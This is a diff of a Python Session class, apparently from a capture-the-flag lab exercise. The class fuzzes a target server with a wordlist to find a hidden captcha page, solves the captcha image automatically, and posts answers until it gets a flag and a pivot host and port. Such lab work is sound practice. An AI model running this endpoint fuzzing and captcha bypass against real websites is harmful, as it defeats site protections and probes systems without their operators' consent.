@@ -1,55 +1,80 @@
-from src.tp3.utils.captcha import Captcha
+from pathlib import Path
+
+import requests
+
+from src.tp3.utils.captcha import Captcha, build_templates
+from src.tp3.utils.config import logger
+
+WORDLIST = Path(__file__).resolve().parent.parent / "data" / "wordlist.txt"
 
 
 class Session:
     """
-    Class representing a session to solve a captcha and submit a flag.
-
-    Attributes:
-        url (str): The URL of the captcha.
-        captcha_value (str): The value of the solved captcha.
-        flag_value (str): The value of the flag to submit.
-        valid_flag (str): The valid flag obtained after processing the response.
+    Phase web : trouve l'endpoint cache, franchit le captcha et recupere le pivot
     """
 
-    def __init__(self, url):
+    def __init__(self, target: str, wordlist: Path = WORDLIST) -> None:
         """
-        Initializes a new session with the given URL.
+        Prepare la session web pour la cible donnee
+        """
+        self.target = target.rstrip("/")
+        self.wordlist = Path(wordlist)
+        self.http = requests.Session()
+        self.templates = build_templates()
+        self.endpoint = ""
+        self.result = {}
 
-        Args:
-            url (str): The URL of the captcha.
+    def words(self) -> list:
         """
-        self.url = url
-        self.captcha_value = ""
-        self.flag_value = ""
-        self.valid_flag = ""
+        Lit la wordlist embarquee (un mot par ligne)
+        """
+        lines = self.wordlist.read_text().splitlines()
+        return [w.strip() for w in lines if w.strip() and not w.startswith("#")]
 
-    def prepare_request(self):
+    def find_endpoint(self) -> str:
         """
-        Prepares the request for sending by capturing and solving the captcha.
+        Fuzze la wordlist et retient la page qui contient un formulaire captcha
         """
-        captcha = Captcha(self.url)
-        captcha.capture()
-        captcha.solve()
+        for word in self.words():
+            url = f"{self.target}/{word}"
+            try:
+                response = self.http.get(url, timeout=5)
+            except requests.RequestException:
+                continue
+            if response.status_code == 200 and "captcha" in response.text.lower():
+                self.endpoint = url
+                logger.info(f"Endpoint cache trouve : {url}")
+                return url
+        raise RuntimeError("endpoint cache introuvable")
 
-        self.captcha_value = captcha.get_value()
-        self.flag_value = "FIXME"
+    def solve_captcha(self) -> str:
+        """
+        Telecharge l'image du captcha (liee a la session) et la resout
+        """
+        image = self.http.get(f"{self.target}/captcha.png", timeout=5).content
+        return Captcha(image, self.templates).solve()
 
-    def submit_request(self):
+    def breach(self, max_tries: int = 20) -> dict:
         """
-        Sends the flag and captcha.
+        Ouvre la session puis poste la reponse du captcha jusqu'a obtenir le pivot
         """
+        self.http.get(self.endpoint, timeout=5)  # pose le cookie de session
+        for _ in range(max_tries):
+            value = self.solve_captcha()
+            response = self.http.post(self.endpoint, data={"captcha": value}, timeout=5)
+            try:
+                data = response.json()
+            except ValueError:
+                continue
+            if "flag1" in data:
+                self.result = data
+                logger.info(f"flag1 recupere, pivot {data['host']}:{data['port']}")
+                return data
+        raise RuntimeError("captcha non franchi apres plusieurs essais")
 
-    def process_response(self):
+    def run(self) -> dict:
         """
-        Processes the response.
+        Enchaine la decouverte de l'endpoint et le franchissement du captcha
         """
-
-    def get_flag(self):
-        """
-        Returns the valid flag.
-
-        Returns:
-            str: The valid flag.
-        """
-        return self.valid_flag
+        self.find_endpoint()
+        return self.breach()
